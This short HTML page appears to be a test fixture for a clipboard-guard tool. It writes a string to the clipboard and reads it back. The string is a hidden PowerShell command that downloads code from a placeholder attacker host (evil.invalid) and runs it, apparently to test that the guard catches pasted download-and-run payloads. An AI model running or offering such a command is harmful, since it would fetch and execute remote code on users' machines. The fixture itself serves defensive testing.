<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Read-back via readText</title>
<script src="common.js"></script></head>
<body><h1>Read-back via readText</h1>
<button id="go">Check</button>
<script>
document.getElementById("go").addEventListener("click", async () => {
  await window.__clipguard.writeText('powershell -w hidden -c "iwr https://evil.invalid/rt | iex"');
  await window.__clipguard.readBack();
});
</script>
</body></html>
